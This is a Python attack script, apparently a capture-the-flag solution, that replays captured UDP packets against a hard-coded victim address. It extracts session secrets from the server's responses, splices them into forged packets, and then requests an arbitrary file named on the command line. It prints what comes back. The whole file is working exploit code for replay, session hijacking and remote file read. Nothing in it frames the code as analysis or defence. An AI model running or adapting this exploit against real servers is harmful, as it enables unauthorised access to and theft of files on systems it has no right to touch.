import sys
import socket
import time
import random

victim_port = 12431
local_port = 47756
local_port = random.randint(10000, 30000)
attacker_ip = '192.168.116.160'
victim_ip = '65.109.198.183'


# Read packets from the extracted file
packets = []
with open('packets.txt', 'r') as f:
    for line in f:
        parts = line.strip().split()
        if len(parts) < 3:  
            continue
        src_ip = parts[0]
        dst_ip = parts[1]
        data = parts[2]
        packets.append({'src_ip': src_ip, 'dst_ip': dst_ip, 'data': data})


# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(2)  # Set timeout to 0.1 seconds

# Bind the socket to the local port (if needed)
sock.bind(('', local_port))

def send_payload(payload, timeout=0.1):
    print(payload)
    payload = bytes.fromhex(payload)
    sock.sendto(payload, (victim_ip, victim_port))
    time.sleep(timeout)

print('[+] Sending Packet1')
payload = packets[0]['data']
send_payload(payload)

print('[+] Waiting for any response from server')
response, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
secret_id1 = response.hex()[88:96]
print(f'Secret1 is {secret_id1}')

print('[+] Sending Packet2')
payload = packets[2]['data']
payload = payload.replace('556bc62a', secret_id1)
send_payload(payload)

print('[+] Waiting for any response from server')
response, addr = sock.recvfrom(1024)  # Buffer size is 1024 bytes
secret_id2 = response.hex()[80:88]
print(f'Secret2 is {secret_id2}')

print('[+] Sending next packet containing file length')
file_name = sys.argv[1].encode()
payload = f'57b1aff4c0000001000346c4' + secret_id2 + len(file_name).to_bytes(4, byteorder='little').hex()
send_payload(payload)

print('[+] Sending payload read file')
payload = f'57b1aff5c0000002000346c4' + secret_id2 + file_name.hex()
send_payload(payload)

for i in range(10):
    response, addr = sock.recvfrom(2048)  # Buffer size is 1024 bytes
    response_text = response.decode('utf-8', errors='ignore')
    print(response_text)
